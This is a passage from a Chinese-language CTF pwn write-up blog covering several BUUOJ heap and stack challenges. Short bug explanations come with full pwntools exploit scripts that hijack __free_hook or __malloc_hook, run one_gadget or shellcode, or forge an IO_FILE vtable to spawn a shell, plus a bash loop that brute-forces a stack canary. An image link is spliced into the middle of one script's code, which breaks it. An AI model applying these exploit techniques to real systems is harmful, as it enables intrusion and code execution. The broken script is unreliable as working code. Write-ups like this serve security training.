class="number">0x208</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment">#index 6</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;spk_chunk&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">merge(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1094</span>,<span class="number">0x10A0</span>,<span class="number">0x10AC</span>,<span class="number">0x10B8</span>,<span class="number">0x1018</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">payload=<span class="string">b&quot;u&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231526971.png" alt=""></p><h2 id="jarvisoj-itemboard">jarvisoj_itemboard</h2><p>本题是控制堆块里存放了delete的函数指针，并且存在UAF漏洞，存在show函数常规泄露libc地址即可。将两个控制堆块都放入fast bin里，然后申请与控制堆块等大的堆块，就可以去控制其中的一个控制堆块，将里面的函数指针改为system地址，此时情况为:</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231756781.png" alt="image-20221123175606412"></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28353&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name=<span class="string">&quot;/bin/sh\x00&quot;</span>,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Item name?\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description&#x27;s len?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description?&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xFBA</span>,<span class="number">0xFC6</span>,<span class="number">0xFD2</span>,<span class="number">0xFDE</span>,<span class="number">0xB4F</span>,<span class="number">0xCCB</span>)</span><br><span class="line">payload=<span class="string">b&quot;/bin/sh;aaaaaaaa&quot;</span>+p64(sys_addr)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;uuuu&#x27;</span>,payload)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-3">ciscn_2019_c_3</h2><p>本题存在两个漏洞，一个是UAF，一个是堆溢出(可以溢出0x10个字节，但代价是无法控制fd和bk指针)</p><p>由于是2.27的libc，所以就double free,释放同一个堆块8次，让其进入unsorted bin，泄露libc地址。</p><p>接下来有俩思路，第一是利用堆溢出篡改size然后打堆块重叠+tcache poisoning劫持free_hook；第二是利用程序里一个backdoor函数，这个函数可以让某个堆块的fd指针加上一个小的值，先打double free让fd指针是一个堆块的地址，然后不断触发backdoor将fd指向free_hook的位置再将其申请出来劫持，最后写入一个one_gadget的地址即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26543&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Give me the name: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;attack_times: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">15</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12D1</span>,<span class="number">0x12DD</span>,<span class="number">0x12E9</span>,<span class="number">0x130B</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(search_og(<span class="number">1</span>)+libc_base))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252054342.png" alt="image-20221125205436933"></p><h2 id="nsctf-online-2019-pwn2">nsctf_online_2019_pwn2</h2><p>本题的漏洞在于这个函数如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252222277.png" alt="image-20221125222254210" style="zoom:50%;" /><p>该函数可以溢出到bss段0x202090的这个地方，从而篡改一字节，就相当于可以任意堆地址写，任意堆地址读，任意堆地址释放(前提是地址范围都是在可控的最后一字节)。接着就去打堆块重叠泄露libc地址，然后打fastbin attack即可。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26263&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_size</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input your name&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_content</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your name&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#Tampering chunk</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">input_content(<span class="string">b&quot;a&quot;</span>*<span class="number">0xb</span>+p64(search_og(<span class="number">1</span>)+libc_base)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCFF</span>,<span class="number">0xD0B</span>,<span class="number">0xD17</span>,<span class="number">0xD23</span>,<span class="number">0xD2F</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252226217.png" alt="image-20221125222657876"></p><h2 id="metasequoia-2020-samsara">metasequoia_2020_samsara</h2><p>本题的漏洞是存在UAF和后门函数，只需要让栈里的一个变量为0xdeadbeef即可，而程序自己泄露了栈地址，并且可以在需要篡改的变量的低地址处写入一个64位无符号数。所以打一个house of spirit即可触发后门。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29238&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Ingredient:\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which kingdom?\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">move(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">input_1(<span class="number">0</span>,stack_addr-<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB99</span>,<span class="number">0xC02</span>,<span class="number">0xC57</span>,<span class="number">0xCCF</span>,<span class="number">0xCE9</span>,<span class="number">0xC9A</span>)</span><br><span class="line">input_1(<span class="number">3</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261111067.png" alt="image-20221126111155652"></p><h2 id="huxiangbei-2019-hacknote">huxiangbei_2019_hacknote</h2><p>本题是静态链接的题目(任何保护都没有)，在edit函数里存在一个off by one的漏洞(第一次输入一个超过size的字符串，第二次再edit一次，就可以触发off by one)，打一个堆块重叠加fastbin attack。因为是静态链接，所以malloc_hook是在data段上，又没开PIE，所以fastbin attack就可以直接劫持fd的位置为malloc_hook。为了绕过检查，改成malloc_hook-0x16如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261551786.png" alt="image-20221126155133663" style="zoom:50%;" /><p>最终将malloc_hook里写入malloc_hook+8后面紧跟shellcode即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26161&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x29</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;iiii&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;prevent merge&#x27;</span>)</span><br><span class="line"><span class="comment">#0x6CB788</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+<span class="string">b&#x27;\xa1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0x6CB788</span>-<span class="number">0x16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="number">0x400EB9</span>,<span class="number">0x400ECA</span>,<span class="number">0x400EA8</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">0x6CB788</span>+<span class="number">8</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261554595.png" alt="image-20221126155434205"></p><h2 id="picoctf-2018-buffer-overflow-3">picoctf_2018_buffer overflow 3</h2><p>本题以 <code>ssh</code> 登录，无法直接去打远程，而是登录远程服务器，来打的本地，需要注意的是本地也没有 <code>pwntools</code> ，所以无法用 <code>py</code> 脚本来打。</p><p>本题就是自己实现了一个四字节的 <code>canary</code> (从 <code>canary.txt</code> 文件中读取的),然后有个明显的栈溢出，并且给了后门函数读取 <code>flag</code></p><p>关键点如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041630782.png" alt="image-20230204163000453" style="zoom:50%;" /><p>第 <code>21</code> 行，可以往 <code>buf</code> 直接溢出，控制 <code>s1</code> ，但需要注意的是 <code>s1</code> 本来的数据存放的就是 <code>canary</code> ，这就意味着我们可以先输入一个字符，因为后面三个字符一定是正确的（不覆盖的话），如果这个字符正确，就可以通过检查，从而实现 <code>canary</code>  一个一个字符的比对。</p><p>因此这里的我们 <code>ssh</code> 登录上后，用这个 <code>shell</code> 命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in &#123;0..255&#125;; do python -c &quot;print \&quot;33\\n\&quot; + \&quot;U\&quot;*32 + chr($i)&quot; | ./vuln &gt;/dev/null &amp;&amp; echo &quot;$i&quot;; done</span><br></pre></td></tr></table></figure><p>来将 <code>canary</code> 的第一个字符来爆破出来，一次类推进行逐位爆破，具体而言，循环语句 <code>for i in &#123;0..255&#125;</code> 将 <code>$i$</code> 从 <code>0</code> 到 <code>255</code> 依次设置为变量。对于每一次迭代，该命令都使用 <code>python</code> 解释器执行以下脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perlCopy code</span><br><span class="line">print &quot;33\n&quot; + &quot;U&quot;*32 + chr($i)</span><br></pre></td></tr></table></figure><p>该脚本打印了字符串 “33\n”，然后使用重复字符 “U” 的字符串（长度为 32）连接上 ASCII 码为 $i 的字符，最后通过管道符（|）将输出重定向到可执行文件 <code>./vuln</code>。输出的内容被重定向到 <code>/dev/null</code>，以避免在屏幕上显示。</p><p>如果执行 <code>./vuln</code> 程序的退出代码为零，则表明程序正常退出，并使用命令 <code>echo &quot;$i&quot;</code> 将当前 $i 的值打印到屏幕上。</p><p>依次类推将每一位的 <code>canary</code> 都爆破出来 ，因为题目给了后门函数，因此最后返回地址填充成后门函数的地址即可</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302050918794.png" alt="image-20230205091810320"></p><h2 id="pwnable-seethefile">pwnable_seethefile</h2><p>这题我是真的烦，这题的 <code>_IO_file_close</code> 和 <code>_IO_new_file_finish</code> 都可以劫持，因为我调试的时候是先看触发了 <code>_IO_file_close</code> ,所以就想着来打这个。按理说只要检查绕过了能触发，劫持<code>vtable</code> 之后打哪个都一样，但是我打 <code>_IO_file_close</code> 远程死活不通（本地是能通的）  然后网上一搜 <code>wp</code> 发现全打的是 <code>_IO_new_file_finish</code> , 我也不知道为啥都会想着去打这个位于后面的函数指针…</p><p>有个除了 <code>flag</code> 文件的任意文件读取，所以直接去读 <code>/proc/self/maps</code> 文件获取 <code>libc</code> 地址，然后有个很明显的篡改文件指针的漏洞，就伪造一个 <code>IO_FILE</code> 然后控制 <code>vtable</code> ，总之这题除了那个获取 <code>libc</code> 地址的操作我是第一次见之外，后面攻击 <code>IO</code> 流都是入门操作… 不说了 越想越气</p><p>这里的 <code>exp</code> 注释的部分是我最初打 <code>_IO_new_file_finish</code> 的 <code>payload</code> 。本题能打通，远程不行…  <strong>注意：获取的 <code>libc</code> 地址 <code>+0x1000</code> 才是 <code>libc</code> 基地址</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>,<span class="string">&quot;node4.buuoj.cn:25199&quot;</span>,<span class="string">&quot;/home/zikh/Desktop/buu32-libc-2.23.so&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineaft![image-<span class="number">20230208221017928</span>](C:/Users/<span class="number">86137</span>/AppData/Roaming/Typora/typora-user-images/image-<span class="number">20230208221017928.</span>png)er(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">heap_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0003a940</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># vtable_addr=0xdeadbeef</span></span><br><span class="line"><span class="comment"># io_file_addr=0x804b284</span></span><br><span class="line"><span class="comment"># io_file=b&quot;/bin/sh;&quot;#_flags</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*11</span></span><br><span class="line"><span class="comment"># io_file+=p32(libc_base+0x1d8ce0)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x3)#fileno</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*3</span></span><br><span class="line"><span class="comment"># io_file+=p32(heap_base+0x1208)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xffffffff)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xdeadbeef)*17</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x804b2d8)</span></span><br><span class="line"><span class="comment"># io_file+=p32(sys_addr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 